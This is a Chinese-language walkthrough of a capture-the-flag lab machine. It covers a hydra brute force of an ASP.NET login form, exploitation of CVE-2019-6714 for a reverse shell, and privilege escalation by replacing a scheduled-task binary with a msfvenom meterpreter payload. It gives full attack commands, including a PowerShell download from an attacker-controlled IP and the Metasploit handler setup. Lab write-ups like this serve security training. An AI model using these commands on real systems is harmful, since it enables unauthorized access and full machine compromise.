## hydra
首先需要找到要攻击的登录页面，并确定表单向 Web 服务器发出的请求类型。通常，Web 服务器发出两种类型的请求，一种是用于从 Web 服务器请求数据的 GET 请求，另一种是用于将数据发送到服务器的 POST 请求。

```
hydra -l admin -P /home/kali/下载/rockyou.txt 10.10.182.107 http-post-form "/Account/login.aspx:__VIEWSTATE=bHtBaxeGBDVWuciTbSdua413rA52xSgfkZOpp5pNtd5L%2BW7JJ3rvmGnQVBQ8WPa7K8F2frmzFWSruzLRe4eeOztkJmkDqgCe25QYJDTnYWAYtza%2FtAA1cpniPjfDU%2Fj6KEP5BAgqgEMcfM4RzcNjT2LOoXNpqlVLIhCalMEi0sd9N1Cg6OPXdUfSzSV0BSFtzjJf%2BHI5q%2B%2F3NMaqOgLCDDAwoXVpZ21o49k%2BzJO9lAgrX5Y4AnGS0zZNOAi2OBE0b%2BmrUFGeqVGH9k5gOjGRKSQ0MwmhrJvxMFscjYFKMUFpbqdyCmA7v9lWloXZu4Qmo6mBSXhX2QJJWt%2FKqloofGoP9DbGXhLVYooLTL2EQ8S%2B%2F8k2&__EVENTVALIDATION=ixozvy91Xs5g5EMUDPd8KdKFouaqL9lzCy75PtarrcKQrEOquCkd6LJit1G8QX5i8B17f088XJj%2BUKh5yGN4OJCIvhNU%2FgzXfSH8L1t%2FlVU7luLVvSYJR0J9mQW8ym7mHRBw0Erdw1AvDkRIoXqL14dMowAJOzseIIrMMdGp%2BQOf6N30&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed"
```

在这里我们需要f12找到网络中的请求包 将完整的request作为hydra需要的参数 要注意UserName=^USER^和Password=^PASS^需要改成^USER^和^PASS^ 不能是自己输入的参数

![image.png](https://s2.loli.net/2025/04/18/BJNz21SVRphGqCo.png)

![image.png](https://s2.loli.net/2025/04/18/sd9wpTcCQOqbWg7.png)

破解成功

## 漏洞攻击
接下来根据漏洞 攻击



CVE-2019-6714 下载cs文件之后需要把ip改成自己vpn分配的ip 修改完成之后将名字改为PostView.ascx

上传成功之后在靶机ip/?theme=../../App_Data/files就能反弹shell


![image.png](https://s2.loli.net/2025/04/18/RzSrhFnveKjBTfx.png)


![image.png](https://s2.loli.net/2025/04/18/t9MdyKXCgWpBQIh.png)

我们这里已经获得了shell 我们需要拓展一下 拓展到msf中 我们写一个msfvenom 用python传到靶机上 运行exe文件 就能获得msf的终端

## msf权限提升
用multi/handler来获得shell
![image.png](https://s2.loli.net/2025/04/18/QVh5xquJWUkMLnG.png)

![image.png](https://s2.loli.net/2025/04/18/gICMmUkhu3zjLfi.png)

这个问题有点意思 我是没接触过 学习学习一下思路


在meterpreter用了ps查看进程

用了winpea来直接扫描

发现一个WindowsScheduler
![image.png](https://s2.loli.net/2025/04/18/Be19fUNSyFtOHoL.png)

sc qc检查一下 也没啥收获 到他所在的路径看一下
![image.png](https://s2.loli.net/2025/04/18/PhLDlbp2x3MWG9w.png)

![image.png](https://s2.loli.net/2025/04/18/FX26SAUTHxu5aQt.png)

有个事件文件 检查一下这个文件

![image.png](https://s2.loli.net/2025/04/18/I3rMpbc5sOPQ1vX.png)

事件中有个message.exe 用的还是管理员权限 应该没毛病了

![image.png](https://s2.loli.net/2025/04/18/X5w18WvqVkdFHPs.png)

接下来是两个flag

利用异常服务及其对应的二进制文件进行提权。

有点东西了

后面的其中一个思路就是msfvenom重新创建一个Message.exe来替换掉原本的 就是替换掉原本有管理权限的exe

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.40.203 LPORT=6666 -e x86/shikata_ga_nai -f exe -o Message.exe
```

用powershell上传成功

```
powershell -c wget "http://10.17.40.203:8000/Message.exe" -outfile "Message1.exe"
```

![image.png](https://s2.loli.net/2025/04/18/rya1OslE9phSomT.png)

把原本的文件替换掉

```
mv Message.exe Message.exe.bak

mv Message1.exe Message.exe
```

替换完就可以run一下msf的反弹模块

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.17.40.203
set LPORT 6666
run
```

![image.png](https://s2.loli.net/2025/04/18/XG2ElbfTDveMCuy.png)
成功获得管理员权限

有管理员权限就能一下子获得两个flag